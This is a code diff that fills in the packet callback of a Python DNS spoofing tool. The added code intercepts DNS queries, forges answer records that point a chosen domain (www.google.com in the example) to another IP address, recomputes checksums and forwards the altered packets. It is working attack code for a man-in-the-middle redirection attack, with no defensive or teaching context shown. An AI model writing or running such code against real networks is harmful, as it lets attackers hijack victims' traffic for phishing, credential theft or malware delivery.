@@ -25,8 +25,21 @@ class Dns_spoof:
 
     def call_back(bin_packet):
         packet = IP(bin_packet.get_payload())
-        if packet.haslayer(DNS):
-            pass
+        if packet.haslayer(DNSQR):
+            try:
+                queryName = packet[DNSQR].qname
+                if queryName in host:
+                    packet[DNS].an = DNSRR(
+                        rrname=queryName, rdata=host[queryName])
+                    packet[DNS].ancount = 1
+                    del packet[IP].len
+                    del packet[IP].chksum
+                    del packet[UDP].len
+                    del packet[UDP].chksum
+            except IndexError as error:
+                return False
+            packet.set_payload(bytes(packet))
+        return packet.accept()
 
 if __name__ == '__main__':
     host = ("www.google.com", "188.114.96.0")
